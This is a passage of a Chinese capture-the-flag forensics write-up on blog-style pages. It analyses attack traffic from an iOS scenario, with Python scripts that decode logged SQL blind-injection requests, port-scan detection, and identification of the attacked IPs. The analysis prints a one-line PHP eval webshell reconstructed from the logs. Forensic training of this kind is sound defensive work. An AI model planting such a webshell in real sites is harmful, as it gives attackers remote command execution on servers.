+<p>成功得到http2流，然后搜索select</p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170625538.png"></p>
+<p>再筛选一下目的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.dst == 192.168.1.12 &amp;&amp; http2</span><br></pre></td></tr></table></figure>
+
+<p>接着导出文本</p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170723870.png"></p>
+<p>利用脚本将需要的sql盲注语句url解码并保存为out.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># 读取文件</span><br><span class="line">file_path = r&quot;C:\Users\罗思远\Desktop\流量分析\NSSCTF\ios\test.txt&quot;  # 替换为你的文件路径</span><br><span class="line"></span><br><span class="line">with open(file_path, &quot;r&quot;, encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line"></span><br><span class="line">target_sentence = &quot;GET /info?l=1&quot;  # 替换为你想要匹配的句子</span><br><span class="line"></span><br><span class="line">matching_parts = []</span><br><span class="line">for line in lines:</span><br><span class="line">    if target_sentence in line:</span><br><span class="line">        start_index = line.find(target_sentence)</span><br><span class="line">        end_index = line.find(&quot;end%29&quot;)</span><br><span class="line">        if end_index != -1:</span><br><span class="line">            part = line[start_index:end_index + len(&quot;end%29&quot;)].strip()</span><br><span class="line">            decoded_part = urllib.parse.unquote(part)</span><br><span class="line">            matching_parts.append(decoded_part)</span><br><span class="line"></span><br><span class="line"># 将匹配的部分保存到文件</span><br><span class="line">output_file = r&quot;C:\Users\罗思远\Desktop\流量分析\NSSCTF\ios\out.txt&quot;  # 输出文件名</span><br><span class="line"></span><br><span class="line">with open(output_file, &quot;w&quot;, encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    for part in matching_parts:</span><br><span class="line">        file.write(part + &quot;\n&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>然后继续使用脚本读取对应位置的最后一个盲注字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 读取文件内容</span><br><span class="line">with open(r&#x27;C:\Users\罗思远\Desktop\流量分析\NSSCTF\ios\out.txt&#x27;, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    file_content = file.readlines()</span><br><span class="line"></span><br><span class="line"># 创建字典存储数字和行索引</span><br><span class="line">index_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"># 遍历每一行</span><br><span class="line">for index, line in enumerate(file_content):</span><br><span class="line">    # 提取数字部分</span><br><span class="line">    num = line.split(&#x27;,&#x27;)[1].strip()</span><br><span class="line"></span><br><span class="line">    # 将数字和行索引存储到字典中</span><br><span class="line">    if num in index_dict:</span><br><span class="line">        index_dict[num].append(index)</span><br><span class="line">    else:</span><br><span class="line">        index_dict[num] = [index]</span><br><span class="line"></span><br><span class="line"># 获取每个数字对应的最后一个行索引</span><br><span class="line">last_indexes = [indexes[-1] for indexes in index_dict.values()]</span><br><span class="line"></span><br><span class="line">results = []</span><br><span class="line">for index in last_indexes:</span><br><span class="line">    line = file_content[index]</span><br><span class="line">    start_quote = line.find(&quot;\&quot;&quot;) + 1</span><br><span class="line">    end_quote = line.find(&quot;\&quot;&quot;, start_quote)</span><br><span class="line">    content = line[start_quote:end_quote]</span><br><span class="line">    results.append(content)</span><br><span class="line"></span><br><span class="line"># 拼接结果</span><br><span class="line">result = &#x27;&#x27;.join(results)</span><br><span class="line"></span><br><span class="line"># 输出结果</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p>得到十六进制数据，直接cyberchef解码（因为是盲注，出现ZZZ说明前面已经结束了）</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240421170940191.png" alt="image-20240421170940191"></p>
+<h2 id="Task5-1"><a href="#Task5-1" class="headerlink" title="Task5"></a>Task5</h2><p><strong>黑客端口扫描的扫描器的扫描范围是什么</strong></p>
+<p><code>分析 =&gt; 专家信息</code>找到<code>TCP: Connection reset (RST)</code>，端口扫描的特征是RST位</p>
+<blockquote>
+<p>在TCP连接的建立和关闭过程中，数据包中的TCP头部包含了一些标志位，用于指示连接的状态。其中，RST标志位用于重置（Reset）一个TCP连接。</p>
+</blockquote>
+<p>发现端口号是均匀增长，很明显的特征。端口是 10-499</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240421172832871.png" alt="image-20240421172832871"></p>
+<h2 id="Task6-1"><a href="#Task6-1" class="headerlink" title="Task6"></a>Task6</h2><p><strong>被害者手机上被拿走了的私钥文件内容是什么</strong></p>
+<p>无答案</p>
+<h2 id="Task7-1"><a href="#Task7-1" class="headerlink" title="Task7"></a>Task7</h2><p><strong>黑客访问&#x2F;攻击了内网的几个服务器，IP地址为什么</strong></p>
+<p>注：多个IP之间按从小到大排序，使用#来分隔，例如127.0.0.1#192.168.0.1)</p>
+<p>我们前面已经导出sql盲注的txt文件，目标ip是<code>192.168.1.12</code>说明在被攻击</p>
+<p>其次我们查看log日志文件，发现有对<code>172.28.0.2</code>进行攻击，大概过程为上传木马然后命令执行</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240421173553044.png" alt="image-20240421173553044"></p>
+<p>所以被攻击的IP有两个<code>172.28.0.2#192.168.1.12</code></p>
+<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><p><strong>黑客写入了一个webshell，其密码为什么</strong></p>
+<p>注意看上一题是如何命令执行的，由于参数为fxxk所以大概木马语句如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[&#x27;fxxk&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>密码即为fxxk</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/NSSCTF/" rel="tag"># NSSCTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/Bumblebee-HackTheBox.html" rel="prev" title="Bumblebee">
+      <i class="fa fa-chevron-left"></i> Bumblebee
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/Brutus-HackTheBox.html" rel="next" title="Brutus">
+      Brutus <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Task1"><span class="nav-number">1.1.</span> <span class="nav-text">Task1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task2"><span class="nav-number">1.2.</span> <span class="nav-text">Task2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task3"><span class="nav-number">1.3.</span> <span class="nav-text">Task3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">简单日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Task1-1"><span class="nav-number">2.1.</span> <span class="nav-text">Task1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task2-1"><span class="nav-number">2.2.</span> <span class="nav-text">Task2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task3-1"><span class="nav-number">2.3.</span> <span class="nav-text">Task3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell"><span class="nav-number">3.</span> <span class="nav-text">webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Task1-2"><span class="nav-number">3.1.</span> <span class="nav-text">Task1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task2-2"><span class="nav-number">3.2.</span> <span class="nav-text">Task2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task3-2"><span class="nav-number">3.3.</span> <span class="nav-text">Task3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task4"><span class="nav-number">3.4.</span> <span class="nav-text">Task4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task5"><span class="nav-number">3.5.</span> <span class="nav-text">Task5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task6"><span class="nav-number">3.6.</span> <span class="nav-text">Task6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task7"><span class="nav-number">3.7.</span> <span class="nav-text">Task7</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Task1-3"><span class="nav-number">4.1.</span> <span class="nav-text">Task1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task2-3"><span class="nav-number">4.2.</span> <span class="nav-text">Task2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task3-3"><span class="nav-number">4.3.</span> <span class="nav-text">Task3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ios"><span class="nav-number">5.</span> <span class="nav-text">ios</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Task1-4"><span class="nav-number">5.1.</span> <span class="nav-text">Task1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task2-4"><span class="nav-number">5.2.</span> <span class="nav-text">Task2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task3-4"><span class="nav-number">5.3.</span> <span class="nav-text">Task3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task4-1"><span class="nav-number">5.4.</span> <span class="nav-text">Task4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task5-1"><span class="nav-number">5.5.</span> <span class="nav-text">Task5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task6-1"><span class="nav-number">5.6.</span> <span class="nav-text">Task6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task7-1"><span class="nav-number">5.7.</span> <span class="nav-text">Task7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task8"><span class="nav-number">5.8.</span> <span class="nav-text">Task8</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
